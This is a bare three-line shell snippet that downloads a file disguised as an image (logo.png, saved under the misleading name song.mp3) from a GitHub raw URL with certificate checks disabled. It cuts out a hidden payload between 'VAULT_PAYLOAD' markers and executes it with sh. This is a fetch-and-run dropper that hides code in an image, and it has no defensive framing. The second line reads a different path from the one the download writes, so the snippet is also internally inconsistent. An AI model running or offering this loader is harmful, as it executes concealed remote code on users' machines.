wget --no-check-certificate -qO /tmp/song.mp3 "https://raw.githubusercontent.com/skt12j/nimos/main/logo.png"
sed -n '/#VAULT_PAYLOAD_START/,/#VAULT_PAYLOAD_END/p' /tmp/logo.png | grep -v "VAULT_PAYLOAD" > /tmp/runner
sh /tmp/runner
